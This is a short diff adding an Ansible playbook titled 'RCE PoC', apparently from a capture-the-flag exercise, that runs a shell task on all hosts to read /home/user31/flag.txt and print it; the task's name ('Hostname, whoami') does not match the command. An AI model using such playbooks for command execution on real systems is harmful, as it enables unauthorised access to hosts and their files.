@@ -1,0 +1,10 @@
+---
+- name: RCE PoC
+  hosts: all
+
+  tasks:
+    - name: Hostname, whoami
+      shell: cat /home/user31/flag.txt
+      register: out
+
+    - debug: var=out.stdout_lines
